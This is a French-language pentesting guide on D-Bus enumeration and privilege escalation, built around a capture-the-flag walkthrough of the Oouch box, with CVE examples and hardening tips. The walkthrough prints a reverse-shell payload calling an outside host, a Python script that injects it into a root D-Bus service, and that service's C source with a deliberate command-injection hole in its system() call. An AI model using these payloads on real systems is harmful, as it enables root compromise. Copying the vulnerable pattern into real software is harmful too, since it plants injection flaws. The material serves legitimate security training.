# D-Bus Enumeration & Command Injection Escalation de privilèges

{{#include ../../banners/hacktricks-training.md}}

## **Énumération GUI**

D-Bus est utilisé comme médiateur de communication interprocessus (IPC) dans les environnements de bureau Ubuntu. Sur Ubuntu, plusieurs bus de messages fonctionnent simultanément : le bus système, principalement utilisé par les **services privilégiés pour exposer des services pertinents à l’échelle du système**, et un bus de session pour chaque utilisateur connecté, qui expose des services pertinents uniquement pour cet utilisateur. Nous nous concentrons principalement sur le bus système, car il est associé à des services exécutés avec des privilèges élevés (par exemple, root), notre objectif étant d’élever nos privilèges. L’architecture de D-Bus utilise un « routeur » pour chaque bus de session, chargé de rediriger les messages des clients vers les services appropriés, en fonction de l’adresse spécifiée par les clients pour le service avec lequel ils souhaitent communiquer.<sup>[[1]](#references)</sup>

Les services sur D-Bus sont définis par les **objets** et **interfaces** qu’ils exposent. Les objets peuvent être comparés à des instances de classe dans les langages OOP classiques, chaque instance étant identifiée de manière unique par un **chemin d’objet**. Ce chemin, similaire à un chemin de système de fichiers, identifie de manière unique chaque objet exposé par le service. L’interface **org.freedesktop.DBus.Introspectable** est particulièrement utile pour la recherche. Elle comprend une seule méthode, Introspect. Cette méthode renvoie une représentation XML des méthodes, signaux et propriétés pris en charge par l’objet. Nous nous intéressons ici aux méthodes et omettons les propriétés et les signaux.

Deux outils ont été utilisés pour communiquer avec l’interface D-Bus : **gdbus**, un outil CLI permettant d’appeler facilement, dans des scripts, les méthodes exposées par D-Bus, et [**D-Feet**](https://wiki.gnome.org/Apps/DFeet), un outil GUI basé sur Python conçu pour énumérer les services disponibles sur chaque bus et afficher les objets contenus dans chaque service.

```bash
sudo apt-get install d-feet
```

Si vous vérifiez le **bus de session**, confirmez d’abord l’adresse actuelle :

```bash
echo "$DBUS_SESSION_BUS_ADDRESS"
```

![https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-21.png](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-21.png)

![https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-22.png](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-22.png)

La première image montre les services enregistrés auprès du bus système D-Bus, avec **org.debin.apt** mis en évidence après avoir sélectionné le bouton System Bus. D-Feet interroge ce service pour obtenir ses objets et affiche les interfaces, méthodes, propriétés et signaux des objets sélectionnés, comme on le voit dans la deuxième image. La signature de chaque méthode est également détaillée.

Une fonctionnalité notable est l'affichage du **process ID (pid)** du service et de sa **ligne de commande**, utile pour vérifier si le service s'exécute avec des privilèges élevés, ce qui est important pour l'intérêt de la recherche.

**D-Feet permet également d'invoquer des méthodes** : les utilisateurs peuvent saisir des expressions Python comme paramètres, que D-Feet convertit en types D-Bus avant de les transmettre au service.

Notez toutefois que **certaines méthodes nécessitent une authentification** avant de nous autoriser à les invoquer. Nous ignorerons ces méthodes, puisque notre objectif est précisément d'élever nos privilèges sans identifiants.

Notez également que certains services interrogent un autre service D-Bus, nommé org.freedeskto.PolicyKit1, pour déterminer si un utilisateur doit être autorisé ou non à effectuer certaines actions.

## **Énumération en ligne de commande**

### Lister les objets du service

Il est possible de lister les interfaces D-Bus ouvertes avec :

```bash
busctl list #List D-Bus interfaces

NAME                                   PID PROCESS         USER             CONNECTION    UNIT                      SE
:1.0                                     1 systemd         root             :1.0          init.scope                -
:1.1345                              12817 busctl          qtc              :1.1345       session-729.scope         72
:1.2                                  1576 systemd-timesyn systemd-timesync :1.2          systemd-timesyncd.service -
:1.3                                  2609 dbus-server     root             :1.3          dbus-server.service       -
:1.4                                  2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
:1.6                                  2612 systemd-logind  root             :1.6          systemd-logind.service    -
:1.8                                  3087 unattended-upgr root             :1.8          unattended-upgrades.serv… -
:1.820                                6583 systemd         qtc              :1.820        user@1000.service         -
com.ubuntu.SoftwareProperties            - -               -                (activatable) -                         -
fi.epitest.hostap.WPASupplicant       2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
fi.w1.wpa_supplicant1                 2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
htb.oouch.Block                       2609 dbus-server     root             :1.3          dbus-server.service       -
org.bluez                                - -               -                (activatable) -                         -
org.freedesktop.DBus                     1 systemd         root             -             init.scope                -
org.freedesktop.PackageKit               - -               -                (activatable) -                         -
org.freedesktop.PolicyKit1               - -               -                (activatable) -                         -
org.freedesktop.hostname1                - -               -                (activatable) -                         -
org.freedesktop.locale1                  - -               -                (activatable) -                         -
```

Les services marqués **`(activatable)`** sont particulièrement intéressants, car ils **ne sont pas encore en cours d’exécution**, mais une requête sur le bus peut les démarrer à la demande. Ne vous arrêtez pas à `busctl list` ; associez ces noms aux binaires qu’ils exécuteraient réellement.

```bash
ls -la /usr/share/dbus-1/system-services/ /usr/share/dbus-1/services/ 2>/dev/null
grep -RInE '^(Name|Exec|User)=' /usr/share/dbus-1/system-services /usr/share/dbus-1/services 2>/dev/null
```

Cela vous indique rapidement quel chemin `Exec=` sera lancé pour un nom activable et sous quelle identité. Si le binaire ou sa chaîne d’exécution est mal protégé, un service inactif peut tout de même devenir une voie d’escalade de privilèges.

Pour un service privilégié d’imagerie USB, mettez en corrélation son nom sur le bus système avec la politique **effective** pour son action d’écriture d’image. Une ancienne règle du fournisseur peut accorder à un groupe Unix administratif `ResultActive=yes` sans demander de mot de passe ; vérifiez que le compte actuel appartient à ce groupe, que la session est active, que la règle est bien chargée et n’est pas remplacée, et que l’assistant installé accepte toujours des chemins source et destination choisis par l’appelant. Le descripteur du service ou une ancienne version du paquet ne prouve pas à lui seul qu’un accès arbitraire aux fichiers est possible. L’absence de descripteur d’activation n’exclut pas non plus qu’un service soit déjà en cours d’exécution. Examinez les fichiers de politique et de service statiques sans appeler la méthode d’écriture d’image ; voir l’[analyse originale du service](https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/).

#### Connexions

[Depuis Wikipédia :](https://en.wikipedia.org/wiki/D-Bus) Lorsqu’un processus établit une connexion à un bus, celui-ci attribue à la connexion un nom de bus spécial appelé _nom de connexion unique_. Les noms de bus de ce type sont immuables : ils ne changent pas tant que la connexion existe et, plus important encore, ils ne peuvent pas être réutilisés pendant la durée de vie du bus. Cela signifie qu’aucune autre connexion à ce bus ne se verra jamais attribuer ce nom de connexion unique, même si le même processus ferme sa connexion au bus puis en crée une nouvelle. Les noms de connexion uniques sont facilement reconnaissables, car ils commencent par le caractère deux-points, normalement interdit.<sup>[[4]](#references)</sup>

### Informations sur l’objet du service

Ensuite, vous pouvez obtenir des informations sur l’interface avec :

```bash
busctl status htb.oouch.Block #Get info of "htb.oouch.Block" interface

PID=2609
PPID=1
TTY=n/a
UID=0
EUID=0
SUID=0
FSUID=0
GID=0
EGID=0
SGID=0
FSGID=0
SupplementaryGIDs=
Comm=dbus-server
CommandLine=/root/dbus-server
Label=unconfined
CGroup=/system.slice/dbus-server.service
Unit=dbus-server.service
Slice=system.slice
UserUnit=n/a
UserSlice=n/a
Session=n/a
AuditLoginUID=n/a
AuditSessionID=n/a
UniqueName=:1.3
EffectiveCapabilities=cap_chown cap_dac_override cap_dac_read_search
        cap_fowner cap_fsetid cap_kill cap_setgid
        cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
        cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
        cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
        cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
        cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
        cap_mknod cap_lease cap_audit_write cap_audit_control
        cap_setfcap cap_mac_override cap_mac_admin cap_syslog
        cap_wake_alarm cap_block_suspend cap_audit_read
PermittedCapabilities=cap_chown cap_dac_override cap_dac_read_search
        cap_fowner cap_fsetid cap_kill cap_setgid
        cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
        cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
        cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
        cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
        cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
        cap_mknod cap_lease cap_audit_write cap_audit_control
        cap_setfcap cap_mac_override cap_mac_admin cap_syslog
        cap_wake_alarm cap_block_suspend cap_audit_read
InheritableCapabilities=
BoundingCapabilities=cap_chown cap_dac_override cap_dac_read_search
        cap_fowner cap_fsetid cap_kill cap_setgid
        cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
        cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
        cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
        cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
        cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
        cap_mknod cap_lease cap_audit_write cap_audit_control
        cap_setfcap cap_mac_override cap_mac_admin cap_syslog
        cap_wake_alarm cap_block_suspend cap_audit_read
```

Corrélez également le nom du bus avec son unité `systemd` et le chemin de l’exécutable :

```bash
systemctl status dbus-server.service --no-pager
systemctl cat dbus-server.service
namei -l /root/dbus-server
```

Cela répond à la question opérationnelle importante lors d’une privesc : **si un appel de méthode réussit, quel binaire et quelle unité réels effectueront l’action ?**

### Lister les interfaces d’un objet de service

Vous devez disposer de permissions suffisantes.

```bash
busctl tree htb.oouch.Block #Get Interfaces of the service object

└─/htb
  └─/htb/oouch
    └─/htb/oouch/Block
```

### Inspecter l’interface d’un objet de service

Notez que, dans cet exemple, la dernière interface découverte à l’aide du paramètre `tree` a été sélectionnée (_voir la section précédente_) :

```bash
busctl introspect htb.oouch.Block /htb/oouch/Block #Get methods of the interface

NAME                                TYPE      SIGNATURE RESULT/VALUE FLAGS
htb.oouch.Block                     interface -         -            -
.Block                              method    s         s            -
org.freedesktop.DBus.Introspectable interface -         -            -
.Introspect                         method    -         s            -
org.freedesktop.DBus.Peer           interface -         -            -
.GetMachineId                       method    -         s            -
.Ping                               method    -         -            -
org.freedesktop.DBus.Properties     interface -         -            -
.Get                                method    ss        v            -
.GetAll                             method    s         a{sv}        -
.Set                                method    ssv       -            -
.PropertiesChanged                  signal    sa{sv}as  -            -
```

Notez la méthode `.Block` de l’interface `htb.oouch.Block` (celle qui nous intéresse). Le « s » des autres colonnes peut indiquer qu’elle attend une string.

Avant d’essayer quoi que ce soit de dangereux, validez d’abord une méthode **orientée lecture** ou présentant un faible risque. Cela permet de distinguer clairement trois cas : syntaxe incorrecte, méthode accessible mais refusée, ou méthode accessible et autorisée.

```bash
busctl call org.freedesktop.login1 /org/freedesktop/login1 org.freedesktop.login1.Manager CanReboot
gdbus call --system --dest org.freedesktop.login1 --object-path /org/freedesktop/login1 --method org.freedesktop.login1.Manager.CanReboot
```

### Corréler les méthodes D-Bus avec les politiques et les actions

L’introspection vous indique **ce que** vous pouvez appeler, mais pas **pourquoi** un appel est autorisé ou refusé. Pour une véritable analyse de privesc, vous devez généralement examiner **trois couches à la fois** :

1. **Métadonnées d’activation** (`.service` files ou `SystemdService=`) pour savoir quel binaire et quelle unité seront réellement exécutés.
2. **Politique XML D-Bus** (`/etc/dbus-1/system.d/`, `/usr/share/dbus-1/system.d/`) pour savoir qui peut utiliser `own`, `send_destination` ou `receive_sender`.
3. **Fichiers d’action Polkit** (`/usr/share/polkit-1/actions/*.policy`) pour connaître le modèle d’autorisation par défaut (`allow_active`, `allow_inactive`, `auth_admin`, `auth_self`, `org.freedesktop.policykit.imply`).

Commandes utiles :

```bash
grep -RInE '^(Name|Exec|SystemdService|User)=' /usr/share/dbus-1/system-services /usr/share/dbus-1/services 2>/dev/null
grep -RInE '<(allow|deny) (own|send_destination|receive_sender)=|user=|group=' /etc/dbus-1/system.d /usr/share/dbus-1/system.d /etc/dbus-1/system-local.d 2>/dev/null
grep -RInE 'allow_active|allow_inactive|auth_admin|auth_self|org\.freedesktop\.policykit\.imply' /usr/share/polkit-1/actions 2>/dev/null
pkaction --verbose
```

N’assumez **pas** une correspondance 1:1 entre une méthode D-Bus et une action Polkit. Une même méthode peut choisir une action différente selon l’objet modifié ou le contexte d’exécution. Le workflow pratique est donc le suivant :

1. `busctl introspect` / `gdbus introspect`
2. `pkaction --verbose` et recherchez dans les fichiers `.policy` pertinents
3. sondes live à faible risque avec `busctl call`, `gdbus call` ou `dbusmap --enable-probes --null-agent`

Les services proxy ou de compatibilité méritent une attention particulière. Un **proxy s’exécutant en root** qui transmet des requêtes à un autre service D-Bus via sa propre connexion préétablie peut amener par inadvertance le backend à traiter toutes les requêtes comme venant de l’UID 0, à moins que l’identité de l’appelant d’origine soit revalidée.<sup>[[3]](#references)</sup>

### Interface de surveillance/capture

Avec suffisamment de privilèges (les privilèges `send_destination` et `receive_sender` seuls ne suffisent pas), vous pouvez **surveiller une communication D-Bus**.

Pour **surveiller** une **communication**, vous devez être **root**. Si vous rencontrez encore des problèmes en étant root, consultez [https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/](https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/) et [https://wiki.ubuntu.com/DebuggingDBus](https://wiki.ubuntu.com/DebuggingDBus)

> [!WARNING]
> Si vous savez comment configurer un fichier de configuration D-Bus pour **autoriser les utilisateurs non root à espionner** la communication, veuillez **me contacter** !

Différentes façons de surveiller :

```bash
sudo busctl monitor htb.oouch.Block #Monitor only specified
sudo busctl monitor #System level, even if this works you will only see messages you have permissions to see
sudo dbus-monitor --system #System level, even if this works you will only see messages you have permissions to see
```

Dans l’exemple suivant, l’interface `htb.oouch.Block` est surveillée et **le message "**_**lalalalal**_**" est envoyé à la suite d’un malentendu**:

```bash
busctl monitor htb.oouch.Block

Monitoring bus message stream.
‣ Type=method_call  Endian=l  Flags=0  Version=1  Priority=0 Cookie=2
  Sender=:1.1376  Destination=htb.oouch.Block  Path=/htb/oouch/Block  Interface=htb.oouch.Block  Member=Block
  UniqueName=:1.1376
  MESSAGE "s" {
          STRING "lalalalal";
  };

‣ Type=method_return  Endian=l  Flags=1  Version=1  Priority=0 Cookie=16  ReplyCookie=2
  Sender=:1.3  Destination=:1.1376
  UniqueName=:1.3
  MESSAGE "s" {
          STRING "Carried out :D";
  };
```

Vous pouvez utiliser `capture` à la place de `monitor` pour enregistrer les résultats dans un fichier **pcapng** que Wireshark peut ouvrir :

```bash
sudo busctl capture htb.oouch.Block > dbus-htb.oouch.Block.pcapng
sudo busctl capture > system-bus.pcapng
```

#### Filtrer tout le bruit <a href="#filtering_all_the_noise" id="filtering_all_the_noise"></a>

S’il y a trop d’informations sur le bus, passez une règle de correspondance comme ceci :

```bash
dbus-monitor "type=signal,sender='org.gnome.TypingMonitor',interface='org.gnome.TypingMonitor'"
```

Plusieurs règles peuvent être spécifiées. Si un message correspond à _l’une_ des règles, il sera affiché. Par exemple :

```bash
dbus-monitor "type=error" "sender=org.freedesktop.SystemToolsBackends"
```

```bash
dbus-monitor "type=method_call" "type=method_return" "type=error"
```

Consultez la [documentation D-Bus](http://dbus.freedesktop.org/doc/dbus-specification.html) pour plus d’informations sur la syntaxe des règles de correspondance.<sup>[[7]](#references)</sup>

### Plus

`busctl` propose encore plus d’options, [**vous les trouverez toutes ici**](https://www.freedesktop.org/software/systemd/man/busctl.html).

## **Scénario vulnérable**

En tant qu’utilisateur **qtc sur l’hôte « oouch » de HTB**, vous pouvez trouver un **fichier de configuration D-Bus inattendu** situé dans _/etc/dbus-1/system.d/htb.oouch.Block.conf_ :

```xml
<?xml version="1.0" encoding="UTF-8"?> <!-- -*- XML -*- -->

<!DOCTYPE busconfig PUBLIC
 "-//freedesktop//DTD D-BUS Bus Configuration 1.0//EN"
 "http://www.freedesktop.org/standards/dbus/1.0/busconfig.dtd">

<busconfig>

    <policy user="root">
        <allow own="htb.oouch.Block"/>
    </policy>

	<policy user="www-data">
		<allow send_destination="htb.oouch.Block"/>
		<allow receive_sender="htb.oouch.Block"/>
	</policy>

</busconfig>
```

Notez que, d’après la configuration précédente, **vous devrez être l’utilisateur `root` ou `www-data` pour envoyer et recevoir des informations** via cette communication D-BUS.

En tant qu’utilisateur **qtc** dans le conteneur docker **aeb4525789d8**, vous pouvez trouver du code lié à dbus dans le fichier _/code/oouch/routes.py._ Voici le code intéressant :

```python
if primitive_xss.search(form.textfield.data):
        bus = dbus.SystemBus()
        block_object = bus.get_object('htb.oouch.Block', '/htb/oouch/Block')
        block_iface = dbus.Interface(block_object, dbus_interface='htb.oouch.Block')

        client_ip = request.environ.get('REMOTE_ADDR', request.remote_addr)
        response = block_iface.Block(client_ip)
        bus.close()
        return render_template('hacker.html', title='Hacker')
```

Comme vous pouvez le voir, il **se connecte à une interface D-Bus** et envoie le « client_ip » à la fonction **« Block »**.

De l’autre côté de la connexion D-Bus, un binaire C compilé est en cours d’exécution. Ce code **écoute** la connexion D-Bus **pour recevoir une adresse IP et appelle iptables via la fonction `system`** afin de bloquer l’adresse IP fournie.\
**L’appel à `system` est volontairement vulnérable à l’injection de commandes** : un payload comme celui-ci créera un reverse shell : `;bash -c 'bash -i >& /dev/tcp/10.10.14.44/9191 0>&1' #`

### Exploitez-le

À la fin de cette page, vous trouverez **le code C complet de l’application D-Bus**. Vous pouvez y trouver, entre les lignes 91 et 97, **comment le `D-Bus object path`** et le **`interface name`** sont **enregistrés**. Ces informations seront nécessaires pour envoyer des données à la connexion D-Bus :

```c
        /* Install the object */
        r = sd_bus_add_object_vtable(bus,
                                     &slot,
                                     "/htb/oouch/Block",  /* interface */
                                     "htb.oouch.Block",   /* service object */
                                     block_vtable,
                                     NULL);
```

Aussi, à la ligne 57, vous pouvez constater que **la seule méthode enregistrée** pour cette communication D-Bus s’appelle `Block`(_**C’est pourquoi, dans la section suivante, les payloads seront envoyés à l’objet de service `htb.oouch.Block`, à l’interface `/htb/oouch/Block` et à la méthode `Block`**_):

```c
SD_BUS_METHOD("Block", "s", "s", method_block, SD_BUS_VTABLE_UNPRIVILEGED),
```

#### Python

Le code Python suivant enverra le payload à la connexion D-Bus via la méthode `Block`, avec `block_iface.Block(runme)` (_notez qu’il a été extrait du bloc de code précédent_) :

```python
import dbus
bus = dbus.SystemBus()
block_object = bus.get_object('htb.oouch.Block', '/htb/oouch/Block')
block_iface = dbus.Interface(block_object, dbus_interface='htb.oouch.Block')
runme = ";bash -c 'bash -i >& /dev/tcp/10.10.14.44/9191 0>&1' #"
response = block_iface.Block(runme)
bus.close()
```

#### busctl and dbus-send

```bash
dbus-send --system --print-reply --dest=htb.oouch.Block /htb/oouch/Block htb.oouch.Block.Block string:';pring -c 1 10.10.14.44 #'
```

- `dbus-send` est un outil utilisé pour envoyer un message au « Message Bus »
- Message Bus – Un logiciel utilisé par les systèmes pour faciliter les communications entre applications. Il est lié à Message Queue (les messages sont ordonnés en séquence), mais dans un Message Bus, les messages sont envoyés selon un modèle d’abonnement et très rapidement.
- Le tag « -system » indique qu’il s’agit d’un message système, et non d’un message de session (par défaut).
- Le tag « –print-reply » sert à afficher correctement notre message et à recevoir les réponses dans un format lisible.
- « –dest=Dbus-Interface-Block » indique l’adresse de l’interface Dbus.
- « –string: » indique le type de message que nous voulons envoyer à l’interface. Il existe plusieurs formats pour envoyer des messages, comme double, bytes, booleans, int et objpath. Parmi ceux-ci, « object path » est utile lorsque nous voulons envoyer le chemin d’un fichier à l’interface Dbus. Nous pouvons utiliser un fichier spécial (FIFO) pour transmettre une commande à l’interface en utilisant le nom d’un fichier. « string:; » sert à appeler à nouveau l’object path, où nous plaçons le fichier/la commande reverse shell FIFO.

_Notez que dans `htb.oouch.Block.Block`, la première partie (`htb.oouch.Block`) fait référence à l’objet service et la dernière partie (`.Block`) au nom de la méthode._

### Code C

```c:d-bus_server.c
//sudo apt install pkgconf
//sudo apt install libsystemd-dev
//gcc d-bus_server.c -o dbus_server `pkg-config --cflags --libs libsystemd`

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <systemd/sd-bus.h>

static int method_block(sd_bus_message *m, void *userdata, sd_bus_error *ret_error) {
        char* host = NULL;
        int r;

        /* Read the parameters */
        r = sd_bus_message_read(m, "s", &host);
        if (r < 0) {
                fprintf(stderr, "Failed to obtain hostname: %s\n", strerror(-r));
                return r;
        }

        char command[] = "iptables -A PREROUTING -s %s -t mangle -j DROP";

        int command_len = strlen(command);
        int host_len = strlen(host);

        char* command_buffer = (char *)malloc((host_len + command_len) * sizeof(char));
        if(command_buffer == NULL) {
                fprintf(stderr, "Failed to allocate memory\n");
                return -1;
        }

        sprintf(command_buffer, command, host);

        /* In the first implementation, we simply ran command using system(), since the expected DBus
         * to be threading automatically. However, DBus does not thread and the application will hang
         * forever if some user spawns a shell. Thefore we need to fork (easier than implementing real
         * multithreading)
         */
        int pid = fork();

        if ( pid == 0 ) {
            /* Here we are in the child process. We execute the command and eventually exit. */
            system(command_buffer);
            exit(0);
        } else {
            /* Here we are in the parent process or an error occured. We simply send a genric message.
             * In the first implementation we returned separate error messages for success or failure.
             * However, now we cannot wait for results of the system call. Therefore we simply return
             * a generic. */
            return sd_bus_reply_method_return(m, "s", "Carried out :D");
        }
        r = system(command_buffer);
}


/* The vtable of our little object, implements the net.poettering.Calculator interface */
static const sd_bus_vtable block_vtable[] = {
        SD_BUS_VTABLE_START(0),
        SD_BUS_METHOD("Block", "s", "s", method_block, SD_BUS_VTABLE_UNPRIVILEGED),
        SD_BUS_VTABLE_END
};


int main(int argc, char *argv[]) {
        /*
         * Main method, registeres the htb.oouch.Block service on the system dbus.
         *
         * Paramaters:
         *      argc            (int)             Number of arguments, not required
         *      argv[]          (char**)          Argument array, not required
         *
         * Returns:
         *      Either EXIT_SUCCESS ot EXIT_FAILURE. Howeverm ideally it stays alive
         *      as long as the user keeps it alive.
         */


        /* To prevent a huge numer of defunc process inside the tasklist, we simply ignore client signals */
        signal(SIGCHLD,SIG_IGN);

        sd_bus_slot *slot = NULL;
        sd_bus *bus = NULL;
        int r;

        /* First we need to connect to the system bus. */
        r = sd_bus_open_system(&bus);
        if (r < 0)
        {
                fprintf(stderr, "Failed to connect to system bus: %s\n", strerror(-r));
                goto finish;
        }

        /* Install the object */
        r = sd_bus_add_object_vtable(bus,
                                     &slot,
                                     "/htb/oouch/Block",  /* interface */
                                     "htb.oouch.Block",   /* service object */
                                     block_vtable,
                                     NULL);
        if (r < 0) {
                fprintf(stderr, "Failed to install htb.oouch.Block: %s\n", strerror(-r));
                goto finish;
        }

        /* Register the service name to find out object */
        r = sd_bus_request_name(bus, "htb.oouch.Block", 0);
        if (r < 0) {
                fprintf(stderr, "Failed to acquire service name: %s\n", strerror(-r));
                goto finish;
        }

        /* Infinite loop to process the client requests */
        for (;;) {
                /* Process requests */
                r = sd_bus_process(bus, NULL);
                if (r < 0) {
                        fprintf(stderr, "Failed to process bus: %s\n", strerror(-r));
                        goto finish;
                }
                if (r > 0) /* we processed a request, try to process another one, right-away */
                        continue;

                /* Wait for the next request to process */
                r = sd_bus_wait(bus, (uint64_t) -1);
                if (r < 0) {
                        fprintf(stderr, "Failed to wait on bus: %s\n", strerror(-r));
                        goto finish;
                }
        }

finish:
        sd_bus_slot_unref(slot);
        sd_bus_unref(bus);

        return r < 0 ? EXIT_FAILURE : EXIT_SUCCESS;
}
```

## Utilitaires d’énumération automatisée (2023-2025)

L’énumération manuelle d’une grande surface d’attaque D-Bus avec `busctl`/`gdbus` devient vite pénible. Deux petits utilitaires FOSS publiés ces dernières années peuvent accélérer les opérations de red team ou les CTF :

### dbusmap (« Nmap pour D-Bus »)
* Auteur : @taviso – [https://github.com/taviso/dbusmap](https://github.com/taviso/dbusmap)<sup>[[5]](#references)</sup>
* Écrit en C ; binaire statique unique (<50 kB) qui parcourt tous les chemins d’objet, récupère le XML `Introspect` et l’associe au PID/UID propriétaire.<sup>[[5]](#references)</sup>
* Options utiles :
  ```bash
  # List every service on the *system* bus and dump all callable methods
  sudo dbus-map --dump-methods

  # Actively probe methods/properties you can reach without Polkit prompts
  sudo dbus-map --enable-probes --null-agent --dump-methods --dump-properties
  ```
* L’outil marque les noms bien connus non protégés avec `!`, révélant instantanément les services que vous pouvez *own* (prendre le contrôle) ou les appels de méthode accessibles depuis un shell non privilégié.

### uptux.py
* Auteur : @initstring – [https://github.com/initstring/uptux](https://github.com/initstring/uptux)<sup>[[6]](#references)</sup>
* Script uniquement en Python qui recherche les chemins *writable* dans les unités systemd **et** les fichiers de stratégie D-Bus aux permissions trop larges (p. ex. `send_destination="*"`).<sup>[[6]](#references)</sup>
* Utilisation rapide :
  ```bash
  python3 uptux.py -n          # run all checks but don’t write a log file
  python3 uptux.py -d          # enable verbose debug output
  ```
* Le module D-Bus recherche dans les répertoires ci-dessous et met en évidence tout service qu’un utilisateur normal peut usurper ou détourner :
  * `/etc/dbus-1/system.d/` et `/usr/share/dbus-1/system.d/`
  * `/etc/dbus-1/system-local.d/` (surcharges du fournisseur)

---

## Bugs notables d’escalade de privilèges D-Bus (2024-2025)

Suivre les CVE récemment publiées aide à repérer des schémas non sécurisés similaires dans du code personnalisé. Voici deux bons exemples récents :<sup>[[2]](#references)[[3]](#references)</sup>

| Année | CVE | Composant | Cause première | Leçon offensive |
|------|-----|-----------|------------|------------------|
| 2024 | CVE-2024-45752 | `logiops` ≤ 0.3.4 (`logid`) | Le service exécuté en tant que root exposait une interface D-Bus que les utilisateurs non privilégiés pouvaient reconfigurer, notamment en chargeant des macros contrôlées par un attaquant. | Si un daemon expose la **gestion des appareils/profils/configurations** sur le system bus, considérez les fonctionnalités de configuration modifiable et de macros comme des primitives d’exécution de code, et non comme de simples « réglages ». |
| 2025 | CVE-2025-23222 | Deepin `dde-api-proxy` ≤ 1.0.19 | Un proxy de compatibilité exécuté en tant que root transmettait des requêtes aux services backend sans préserver le contexte de sécurité de l’appelant d’origine. Les backends faisaient donc confiance au proxy en tant qu’UID 0. | Considérez les services D-Bus **proxy / bridge / compatibilité** comme une catégorie de bugs distincte : s’ils relaient des appels privilégiés, vérifiez comment l’UID de l’appelant et le contexte Polkit sont transmis au backend. |

Schémas à repérer :
1. Le service s’exécute **en tant que root sur le system bus**.
2. Soit il n’y a **aucun contrôle d’autorisation**, soit le contrôle est effectué sur le **mauvais sujet**.
3. La méthode accessible finit par modifier l’état du système : installation de paquets, changements d’utilisateurs/groupes, configuration du bootloader, mise à jour des profils d’appareils, écriture de fichiers ou exécution directe de commandes.

Utilisez `dbusmap --enable-probes` ou un `busctl call` manuel pour confirmer qu’une méthode est accessible, puis examinez la policy XML du service et les actions Polkit pour comprendre **quel sujet** est réellement autorisé.

---

## Durcissement et détection : gains rapides

* Recherchez les policies accessibles en écriture par tous ou ouvertes à l’envoi/la réception :
  ```bash
  grep -R --color -nE '<allow (own|send_destination|receive_sender)="[^"]*"' /etc/dbus-1/system.d /usr/share/dbus-1/system.d
  ```
* Exigez Polkit pour les méthodes dangereuses : même les proxies *root* doivent transmettre le PID de l’*appelant* à `polkit_authority_check_authorization_sync()` au lieu du leur.
* Abaissez les privilèges des helpers à longue durée d’exécution (utilisez `sd_pid_get_owner_uid()` pour changer d’espace de noms après la connexion au bus).
* Si vous ne pouvez pas supprimer un service, limitez-le au moins à un groupe Unix dédié et restreignez l’accès dans sa policy XML.
* Blue-team : capturez le bus système avec `busctl capture > /var/log/dbus_$(date +%F).pcapng` et importez-le dans Wireshark pour détecter les anomalies.

---

## References

- [1] [Élévation de privilèges via D-Bus de USBCreator sur Ubuntu Desktop](https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/)
- [2] [CVE-2024-45752 : un service D-Bus permet à tout utilisateur non privilégié de modifier la configuration](https://github.com/PixlOne/logiops/issues/473)
- [3] [dde-api-proxy : contournement de l’authentification dans le service proxy D-Bus de Deepin (CVE-2025-23222)](https://security.opensuse.org/2025/01/24/dde-api-proxy-privilege-escalation.html)
- [4] [D-Bus - Wikipédia](https://en.wikipedia.org/wiki/D-Bus)
- [5] [taviso/dbusmap - « Nmap pour D-Bus »](https://github.com/taviso/dbusmap)
- [6] [initstring/uptux](https://github.com/initstring/uptux)
- [7] [dbus.freedesktop.org - documentation D-Bus](http://dbus.freedesktop.org/doc/dbus-specification.html)
{{#include ../../banners/hacktricks-training.md}}
